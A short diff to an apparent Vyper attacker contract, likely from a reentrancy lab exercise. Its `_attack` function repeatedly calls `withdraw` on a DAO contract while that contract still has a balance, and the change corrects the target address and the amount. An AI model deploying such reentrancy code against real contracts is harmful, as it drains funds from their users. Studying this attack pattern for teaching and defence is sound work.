@@ -19,7 +19,7 @@ def _attack() -> bool:
     # Make sure you add a "base case" to end the recursion
     
     if self.dao_address.balance > 0:
-        DAO(self.owner_address).withdraw(1)
+        DAO(self.dao_address).withdraw(value=deposit_amount)
 
     return True
 
